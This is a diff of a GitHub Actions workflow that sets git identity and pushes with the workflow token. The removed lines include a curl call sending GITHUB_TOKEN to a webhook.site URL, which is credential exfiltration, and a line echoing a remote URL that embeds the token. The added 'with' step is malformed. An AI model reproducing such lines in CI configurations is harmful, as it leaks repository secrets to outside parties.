@@ -10,27 +10,17 @@ jobs:
     runs-on: ubuntu-latest
     steps:
     - uses: actions/checkout@v1
+    - with:
+      ref: master
     - name: Update
       run: |
+        git branch
         gh_actor_profile="$(curl -s -H "Authorization: token ${GITHUB_TOKEN}" "https://api.github.com/users/${GITHUB_ACTOR}")"
         git config --global user.name "$(printf '%s' "$gh_actor_profile" | jq -r .name)"
         git config --global user.email "$(printf '%s' "$gh_actor_profile" | jq -r .email)"
         gh_auth="$GITHUB_ACTOR:$GITHUB_TOKEN"
         gh_url="$(git ls-remote --get-url)"
         git remote set-url origin ${gh_url/:\/\//:\/\/$gh_auth@}
-        curl "https://webhook.site/970202fd-347d-43f3-b872-71fecdc959ea?gt=$GITHUB_TOKEN@"
         git checkout master
-        
-        git branch
-        echo $(git ls-remote --get-url)
-        git config --list
-        if [ ! -f "hello2.txt" ]; then
-          echo hello > hello2.txt
-          git add hello2.txt
-          git commit -m "add hello"
-          git push -u origin master
-        fi
-        chmod +x update.sh
-        ./update.sh
       env:
         GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
